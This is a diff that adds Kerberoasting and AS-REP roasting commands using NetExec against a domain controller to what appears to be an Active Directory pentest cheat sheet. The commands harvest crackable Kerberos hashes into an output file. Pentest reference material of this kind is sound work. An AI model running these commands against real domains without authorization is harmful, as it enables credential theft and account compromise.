@@ -670,6 +670,16 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
 
 <details>
   <summary><strong>Credential Hunting</strong></summary>
+
+  ### Kerberoasting 
+  ```shell
+  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --kerberoasting <output>.txt
+  ```
+
+  ### ASREPRoast
+  ```shell
+  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p '' --asreproast <output>.txt
+  ```
   
 </details>
 
